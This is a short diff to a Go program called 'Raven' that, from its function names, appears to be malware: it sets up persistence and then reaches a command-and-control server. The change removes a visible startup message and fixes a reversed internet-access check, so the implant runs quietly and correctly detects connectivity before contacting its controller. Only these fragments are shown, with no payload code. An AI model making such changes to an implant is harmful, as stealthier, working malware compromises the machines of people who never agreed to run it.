@@ -30,8 +30,6 @@ var (
 var stop = make(chan bool)
 
 func main() {
-	fmt.Println("[*] Initializing Raven ...")
-
 	if !is_persistent() {
 		persist()
 	}
@@ -79,7 +77,7 @@ func has_internet_access() bool {
 	// attempt to connect to some live host
 
 	_, err := http.Get("https://google.com")
-	return err != nil
+	return err == nil
 }
 
 func reach_command_and_control() {
